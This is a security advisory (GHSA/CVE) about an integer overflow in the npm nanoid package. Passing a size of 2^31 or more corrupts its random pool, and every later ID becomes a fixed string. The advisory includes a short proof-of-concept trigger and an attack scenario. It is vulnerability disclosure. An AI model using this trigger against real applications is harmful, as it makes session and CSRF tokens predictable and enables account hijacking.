# [H] nanoid: Integer Overflow or Wraparound

## Summary
Severity: High
Advisory: GHSA-xwg4-73v4-xw9w
CVE: CVE-2026-73086
CWE: CWE-190
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-09-01
Source: https://github.com/advisories/GHSA-xwg4-73v4-xw9w
Type: github-advisory

## Affected
- npm: `nanoid` — affected >=0 <3.3.12
- npm: `nanoid` — affected >=4.0.0 <5.1.11

## Details
### Summary

An integer overflow in `nanoid(size)` permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string `"uuuuuuuuuuuuuuuuuuuuu"`. Any application that passes user-influenced values to the `size` parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.

### Details

`nanoid()` at [`index.js:101`](https://github.com/ai/nanoid/blob/main/index.js#L101) coerces the `size` parameter with `size |= 0`, which converts it to a signed 32-bit integer. When `size >= 2^31` (e.g., `2147483648`), this wraps to `-2147483648`.

The negative value is passed to `fillPool()` ([`index.js:15`](https://github.com/ai/nanoid/blob/main/index.js#L15)):

```javascript
function fillPool(bytes) {
  if (!pool || pool.length < bytes) {       // false: pool exists, -2B < pool.length
    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)
    crypto.getRandomValues(pool)
    poolOffset = 0
  } else if (poolOffset + bytes > pool.length) {  // false: poolOffset + (-2B) < pool.length
    crypto.getRandomValues(pool)
    poolOffset = 0
  }
  poolOffset += bytes  // poolOffset += -2147483648 → deeply negative
}
```

Neither branch triggers, so the pool is never refreshed. `poolOffset` becomes ~-2.1 billion.

Subsequent `nanoid()` calls execute:
```javascript
for (let i = poolOffset - size; i < poolOffset; i++) {
  id += scopedUrlAlphabet[pool[i] & 63]
}
```

`pool[negative_index]` returns `undefined`. `undefined & 63` evaluates to `0`. `urlAlphabet[0]` is `'u'`. Every ID becomes `"uuuuuuuuuuuuuuuuuuuuu"`.

The corruption is **persistent** — it affects all subsequent calls in the process until ~100 million calls eventually wrap `poolOffset` back to positive, or the process restarts.

### PoC

```javascript
import { nanoid } from 'nanoid'

// Step 1: Normal operation
console.log(nanoid())  // e.g., "V1StGXR8_Z5jdHi6B-myT"

// Step 2: Trigger overflow (e.g., from an API parameter)
try { nanoid(2147483648) } catch(e) {}

// Step 3: All subsequent IDs are deterministic
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
// ... forever, process-wide
```

Run with: `node --experimental-vm-modules poc.mjs`

Attack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to `nanoid(userInput)`.

### Impact

**Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.**

- All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable
- An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass
- The corruption is persistent (survives across requests) and affects all consumers of `nanoid` in the same process
- No special privileges or preconditions required — a single unauthenticated request is sufficient
- Affects any application that passes external input to the `size` parameter without validation

## References
- https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w
- https://nvd.nist.gov/vuln/detail/CVE-2026-73086
- https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4
- https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3
- https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac
- https://github.com/ai/nanoid
- https://github.com/ai/nanoid/releases/tag/3.3.12
- https://github.com/ai/nanoid/releases/tag/5.1.11
